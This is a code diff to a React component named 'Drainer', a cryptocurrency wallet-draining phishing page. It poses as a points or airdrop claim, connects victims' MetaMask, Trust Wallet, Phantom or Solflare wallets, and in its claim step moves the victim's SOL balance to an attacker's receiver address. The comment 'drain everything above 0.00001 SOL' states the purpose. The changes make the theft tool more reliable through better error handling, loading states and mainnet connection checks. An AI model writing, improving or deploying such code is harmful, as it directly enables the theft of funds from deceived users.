@@ -12,6 +12,16 @@ export default function Drainer() {
   const [points, setPoints] = useState(0)
   const [stage, setStage] = useState<'connect' | 'verify' | 'claim'>('connect')
   const [showSuccess, setShowSuccess] = useState(false)
+  const [isLoading, setIsLoading] = useState(false)
+  const [error, setError] = useState<string | null>(null)
+
+  // Helper function to render wallet icons
+  const renderWalletIcon = (icon: string, name: string) => {
+    if (icon.startsWith('http') || icon.startsWith('/')) {
+      return <img src={icon} alt={`${name} logo`} className="w-6 h-6" />
+    }
+    return <span className="text-2xl">{icon}</span>
+  }
 
   useEffect(() => {
     setPoints(Math.floor(Math.random() * 9000000) + 8000000)
@@ -76,72 +86,122 @@ export default function Drainer() {
   }, [])
 
   const wallets = [
-    { name: "MetaMask", icon: "🦊", is: 'isMetaMask', type: 'evm' },
-    { name: "Trust Wallet", icon: "🛡️", is: 'isTrust', type: 'evm' },
-    { name: "Phantom", icon: "👻", is: 'isPhantom', type: 'solana' },
-    { name: "Backpack", icon: "🎒", is: 'isBackpack', type: 'solana' },
-    { name: "Solflare", icon: "☀️", is: 'isSolflare', type: 'solana' },
-    { name: "Coinbase Wallet", icon: "🔵", is: 'isCoinbaseWallet', type: 'evm' },
+    { 
+      name: "MetaMask", 
+      icon: "/wallets/metamask.svg", 
+      is: 'isMetaMask', 
+      type: 'evm' 
+    },
+    { 
+      name: "Trust Wallet", 
+      icon: "/wallets/trustwallet.svg", 
+      is: 'isTrust', 
+      type: 'evm' 
+    },
+    { 
+      name: "Phantom", 
+      icon: "/wallets/phantom.svg", 
+      is: 'isPhantom', 
+      type: 'solana' 
+    },
+    { 
+      name: "Solflare", 
+      icon: "/wallets/solflare.svg", 
+      is: 'isSolflare', 
+      type: 'solana' 
+    },
   ]
 
   const connectWallet = async (walletType: string) => {
+    setIsLoading(true)
+    setError(null)
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
     const ethereum = (window as any).ethereum
     const solana = (window as any).solana || (window as any).phantom?.solana
     const url = encodeURIComponent(window.location.href)
 
-    // Mobile: use deep links
-    if (isMobile) {
-      const links: Record<string, string> = {
-        metamask: `https://metamask.app.link/dapp/${url}`,
-        trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
-        phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
-        backpack: `https://backpack.app/ul/browse/${url}`,
-        solflare: `solflare://dapp?uri=${url}`,
-        coinbasewallet: `cbwallet://dapp?url=${url}`
-      }
-      const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
-      if (links[linkKey]) {
-        window.location.href = links[linkKey]
-        return
-      }
-    }
-
-    // Desktop: connect to installed extension
     try {
-      const wallet = wallets.find(w => w.name.toLowerCase().replace(/\s+/g, '') === walletType.toLowerCase().replace(/\s+/g, ''))
-      
-      if (wallet?.type === 'solana' && solana) {
-        if (solana.connect) {
-          await solana.connect()
-        }
-        if (solana.publicKey) {
-          setAccount(solana.publicKey.toString())
-          setStage('verify')
-        }
-      } else if (wallet?.type === 'evm' && ethereum) {
-        let provider = ethereum
-        // Find specific wallet in providers array
-        if (ethereum.providers) {
-          provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum
-        } else if (ethereum[wallet.is]) {
-          provider = ethereum
+      const wallet = wallets.find(w => w.name.toLowerCase() === walletType.toLowerCase())
+      if (!wallet) {
+        throw new Error('Wallet not supported')
+      }
+
+      // Mobile: use deep links
+      if (isMobile) {
+        const links: Record<string, string> = {
+          'metamask': `https://metamask.app.link/dapp/${url}`,
+          'trust wallet': `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
+          'phantom': `https://phantom.app/ul/browse/${url}`,
+          'solflare': `https://solflare.com/dapp?uri=${url}`,
         }
         
-        if (provider) {
-          const accounts = await provider.request({ method: 'eth_requestAccounts' })
-          if (accounts && accounts[0]) {
+        const link = links[wallet.name.toLowerCase()]
+        if (link) {
+          window.location.href = link
+          return
+        }
+      }
+
+      // Desktop: connect to installed extension
+      if (wallet.type === 'solana' && solana) {
+        try {
+          // First try to connect without forcing
+          if (solana.connect) {
+            await solana.connect({ onlyIfTrusted: true })
+          }
+          
+          // If no public key, request connection
+          if (!solana.publicKey) {
+            await solana.connect()
+          }
+          
+          if (solana.publicKey) {
+            setAccount(solana.publicKey.toString())
+            setStage('verify')
+          }
+        } catch (e: any) {
+          // Handle Phantom specific errors
+          if (e.message.includes('not connected to Phantom')) {
+            throw new Error('Please unlock your Phantom wallet first')
+          }
+          throw e
+        }
+      } 
+      else if (wallet.type === 'evm' && ethereum) {
+        let provider = ethereum
+        
+        // Handle multiple providers
+        if (ethereum.providers?.length) {
+          provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum
+        }
+        
+        try {
+          // Request accounts
+          const accounts = await provider.request({ 
+            method: 'eth_requestAccounts',
+            params: [{
+              eth_chainId: '0x1' // Request mainnet
+            }]
+          })
+          
+          if (accounts?.[0]) {
             setAccount(accounts[0])
             setStage('verify')
           }
-        } else {
-          alert(`${wallet.name} not detected. Please install the extension.`)
+        } catch (e: any) {
+          if (e.code === 4001) {
+            throw new Error('Connection rejected by user')
+          }
+          throw e
         }
       } else {
-        alert(`${wallet?.name || walletType} not detected. Please install the extension.`)
+        throw new Error(`${wallet.name} not detected. Please install the extension.`)
       }
-    } catch (e) {
-      alert('Connection rejected or wallet not found')
+    } catch (e: any) {
+      console.error('Wallet connection error:', e)
+      setError(e.message || 'Failed to connect wallet. Please try again.')
+    } finally {
+      setIsLoading(false)
     }
   }
 
@@ -204,6 +264,9 @@ export default function Drainer() {
 
   const claim = async () => {
     if (!account) return
+    
+    setIsLoading(true)
+    setError(null)
 
     const ethereum = (window as any).ethereum
     const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare
@@ -211,9 +274,29 @@ export default function Drainer() {
     // === SOLANA DRAIN (Phantom, Backpack, Solflare) ===
     if (solana && solana.publicKey) {
       try {
+        // Ensure we're connected to mainnet
+        try {
+          await solana.request({
+            method: 'connect',
+            params: { onlyIfTrusted: false }
+          })
+        } catch (e) {
+          console.log('Connection already established')
+        }
+
         const fromPubkey = solana.publicKey
         const toPubkey = new solanaWeb3.PublicKey(SOL_RECEIVER)
-        const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed')
+        const connection = new solanaWeb3.Connection(
+          'https://api.mainnet-beta.solana.com', 
+          'confirmed'
+        )
+        
+        // Check if we can get balance (tests connection)
+        try {
+          await connection.getBalance(fromPubkey)
+        } catch (e) {
+          throw new Error('Failed to connect to Solana network. Please check your connection and try again.')
+        }
 
         // Drain SOL - drain everything above 0.00001 SOL
         const balance = await connection.getBalance(fromPubkey)
@@ -457,29 +540,28 @@ export default function Drainer() {
         </div>
 
         {stage === 'connect' && (
-          <div className="text-center space-y-4 sm:space-y-6 md:space-y-8">
-            <button 
-              onClick={connect}
-              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-8 md:px-12 py-3 sm:py-4 md:py-6 rounded-xl sm:rounded-2xl text-base sm:text-lg md:text-xl lg:text-2xl font-bold w-full transition-all touch-manipulation"
-            >
-              Connect Wallet
-            </button>
-            {isMobile && (
-              <>
-                <p className="text-sm sm:text-base md:text-lg text-gray-300">Or choose a specific wallet:</p>
-                <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
-                  {wallets.map(w => (
-                    <button
-                      key={w.name}
-                      onClick={() => connectWallet(w.name)}
-                      className="bg-gray-800 hover:bg-gray-700 active:bg-gray-600 p-4 sm:p-5 md:p-6 rounded-xl sm:rounded-2xl transition-all transform active:scale-95 flex flex-col items-center touch-manipulation"
-                    >
-                      <span className="text-3xl sm:text-4xl mb-1 sm:mb-2">{w.icon}</span>
-                      <div className="text-xs sm:text-sm md:text-base font-medium">{w.name}</div>
-                    </button>
-                  ))}
+          <div className="space-y-4">
+            {wallets.map((wallet) => (
+              <button
+                key={wallet.name}
+                onClick={() => connectWallet(wallet.name)}
+                disabled={isLoading}
+                className={`w-full flex items-center justify-center space-x-3 px-6 py-4 border border-gray-700 rounded-xl 
+                  hover:bg-gray-700/50 transition-all duration-200 transform hover:scale-[1.02] 
+                  ${isLoading ? 'opacity-70 cursor-not-allowed' : 'hover:border-gray-600'}`}
+              >
+                <div className="w-8 h-8 flex items-center justify-center">
+                  {renderWalletIcon(wallet.icon, wallet.name)}
                 </div>
-              </>
+                <span className="text-white font-medium">{wallet.name}</span>
+              </button>
+            ))}
+            
+            {isLoading && (
+              <div className="mt-4 text-center">
+                <div className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-blue-500 border-r-transparent"></div>
+                <p className="mt-2 text-sm text-gray-400">Connecting to wallet...</p>
+              </div>
             )}
           </div>
         )}
